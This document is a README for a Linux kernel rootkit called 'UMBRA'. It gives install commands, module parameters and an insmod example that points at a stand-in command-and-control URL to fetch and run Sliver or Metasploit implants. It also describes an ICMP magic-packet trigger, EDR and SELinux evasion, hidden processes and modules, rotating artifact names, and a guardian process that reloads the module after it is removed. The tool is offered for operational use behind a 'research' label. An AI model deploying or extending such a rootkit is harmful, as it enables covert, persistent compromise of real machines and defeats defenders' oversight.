# UMBRA

Kernel-residency research module for x86-64 Linux (5.x / 6.x). This is an
independently maintained derivative: the public interface, symbol names, source
layout and branding have been replaced, and the userland staging path has been
reworked around an operator-selected beacon instead of an interactive shell.

## What changed

| Area | Upstream | UMBRA |
|---|---|---|
| Identity | `singularity.ko` | `umbra.ko` |
| Entry points | `singularity_init` / `_exit` | `umbra_boot` / `umbra_halt` |
| Symbols | `hiding_*`, `sd_*`, `fh_*`, `orig_*` | `ub_*` namespaced API |
| Trigger | ICMP magic packet spawned `/bin/bash` reverse shell | ICMP magic packet orders a fresh beacon generation |
| Payload | hardcoded `/dev/tcp` shell | URL-fetched implant (Sliver / Metasploit / custom) |
| Resilience | module-level only | ring-0 keeper + hidden userspace guardian |
| Polymorphism | static names | artifact, ghost title and pidfile rotate every generation |

## Layout

```
entry.c                 module init/exit and subsystem wiring
include/ub_core.h       shared kernel includes
ftrace/hook_engine.*    ftrace hook installer (renamed from ftrace_helper)
modules/armor.*         self-defense / memory hiding
modules/edr_evade.*     EDR (LKRG) evasion
modules/beacon.*        beacon keeper and guardian supervisor
modules/relay.*         ICMP trigger + SELinux enforce mask
modules/veiled_pids.*   hidden process registry
modules/hide_module.*   module list removal
...                     remaining syscall/anti-forensic hooks
scripts/trigger.py      ICMP magic-packet sender
setup.sh                build, configure and load
```

## Build and install

Use `install.sh` — it does preflight, builds against the **running** kernel's
headers, stages the guardian image and loads the module:

```sh
sudo ./install.sh           # interactive, production mode
sudo ./install.sh --test    # observable lab run (recommended first)
sudo ./install.sh --status
sudo ./install.sh --reload  # rebuild + reload with saved config
sudo ./install.sh --uninstall
```

Manual build also works: `make clean && make`.

### Kernel compatibility

There is no portable prebuilt `.ko`: vermagic ties a module to one kernel.
`install.sh` compiles inside the target so the module always matches. The
source carries version guards for the 5.x/6.x/7.x API drift:

- ftrace thunk uses `ftrace_regs_set_instruction_pointer()` on 6.x+, `pt_regs` below.
- module memory layout uses `mem[MOD_TEXT]` on 6.4+, `core_layout` below.
- hook installation is best-effort: renamed/removed internals on a newer
  kernel cost one hook, not the whole subsystem.

Validated clean on `6.12.116+deb13-amd64`. If your kernel (e.g. 7.0) reports
build errors, send the compiler output and I will add the missing guard.

### Preflight checks

`install.sh` refuses to continue if: virtualization is a container,
`modules_disabled=1`, kernel lockdown is active, or headers/toolchain are
missing. It will try `apt`/`dnf`/`pacman` to install headers when absent.

## Configuration

All beacon settings are module parameters (readable under
`/sys/module/umbra/parameters/` after load):

| Parameter | Default | Purpose |
|---|---|---|
| `ub_beacon_url` | *(empty)* | URL of the implant binary. Empty disables the keeper. |
| `ub_beacon_profile` | `sliver` | Name pool: `sliver`, `metasploit`, `custom`. |
| `ub_beacon_args` | *(empty)* | Extra argv passed to the implant. |
| `ub_fetcher` | `curl` | `curl` or `wget` (falls back automatically only if configured). |
| `ub_stage_dir` | `/tmp/.ub-state` | Staging directory for payloads/state (auto-hidden). |
| `ub_guardian_ko` | `/lib/modules/umbra.ko` | Image the guardian reinserts. |
| `ub_beacon_interval` | `20` | Keeper poll interval, seconds. |
| `ub_test_mode` | `0` | `1` disables concealment, guardian and EDR hooks; enables `pr_info` logging. |

Example:

```sh
insmod umbra.ko \
  ub_beacon_url="https://c2.example/implant.bin" \
  ub_beacon_profile=sliver \
  ub_beacon_interval=15
```

Or use `sudo ./setup.sh`, which prompts for the URL/profile/args, stages
`umbra.ko` at `/lib/modules/umbra.ko` for the guardian, and loads the module.

## Trigger

`scripts/trigger.py` sends an ICMP echo request with sequence `1337` from the
address compiled as `UB_RELAY_ADDR` in `include/relay.h`. Receiving it forces an
immediate redeploy: the keeper fetches a fresh binary, gives it a new artifact
name and ghost process title, and tracks the new PID as hidden.

## Persistence model

1. The **keeper** kthread checks the beacon pidfile each interval. If the
   implant is gone, it re-fetches and relaunches it under new names.
2. The keeper writes a heartbeat to `<ub_stage_dir>/hb`.
3. A **guardian** shell process, launched through the UMH path with a masked
   argv[0], watches that heartbeat. If the module is unloaded the heartbeat
   stops, and the guardian reinserts `<ub_guardian_ko>`; the new instance then
   starts a fresh beacon generation.
4. Every generation changes visible identifiers, so filesystem and process
   indicators do not repeat across redeploys.

## Notes

Change all patterns in `include/hiding_directory_def.h`, the relay address in
`include/relay.h`, and the ghost/artifact pools in `modules/beacon.c` before
using this outside a controlled lab.
